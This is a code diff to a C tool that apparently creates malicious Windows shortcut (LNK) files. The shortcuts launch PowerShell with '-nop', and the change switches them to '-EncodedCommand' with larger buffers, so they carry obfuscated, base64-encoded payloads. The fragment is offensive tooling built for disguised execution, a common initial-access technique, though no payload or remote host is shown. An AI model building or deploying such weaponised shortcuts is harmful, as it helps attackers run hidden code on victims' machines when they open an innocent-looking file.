@@ -39,12 +39,13 @@ int createTheLNKArguments(HRESULT hr, IShellLinkW *pShellLink, char *arguments){
     }
 
     //change the format
-    wchar_t wUserArgument[256];
-    MultiByteToWideChar(CP_ACP, 0, arguments, -1, wUserArgument, 256);
+    wchar_t wUserArgument[8192];
+    MultiByteToWideChar(CP_ACP, 0, arguments, -1, wUserArgument, 8192);
 
     //arguments for command
-    wchar_t wArguments[512];
-    swprintf(wArguments, 512, L"-nop -c \"%S\"", wUserArgument);
+    wchar_t wArguments[8192];
+    //add "-c" if you want a clear command, for know is for encodedCommand 
+    swprintf(wArguments, 8192, L"-nop -EncodedCommand %S", wUserArgument);
 
 
     hr = pShellLink->lpVtbl->SetArguments(pShellLink, wArguments);
@@ -171,7 +172,7 @@ int main(int argc, char *argv[]){
         //created
         if(!createLNKFile(hr, pShellLink, argv[2])){
             //all good
-            printf("[+] LNK created!!");
+            printf("[+] LNK created!!\n");
         }
     }
 
